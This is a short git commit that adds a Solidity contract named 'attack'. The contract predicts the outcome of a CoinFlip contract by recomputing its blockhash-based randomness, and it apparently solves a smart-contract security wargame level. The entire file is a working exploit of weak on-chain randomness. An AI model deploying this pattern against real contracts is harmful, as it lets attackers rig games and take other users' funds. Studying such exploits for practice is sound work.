b50503a6883b6f9ec8866ca8f3826416c3c218c1
박시우 <siw0218@naver.com>
2025-11-04 17:49:41 +0900

    Update coinflip.sol

--- coinflip.sol
+++ coinflip.sol
@@ -1,1 +1,30 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract attack {
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+    ICoinFlip coinflip;
+    
+    constructor(address addr) {
+        coinflip=ICoinFlip(addr);
+    }
+
+    function flipattack() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        
+        if (lastHash == blockValue) {
+            revert();
+        }
+        
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        coinflip.flip(side);
+    }
+}
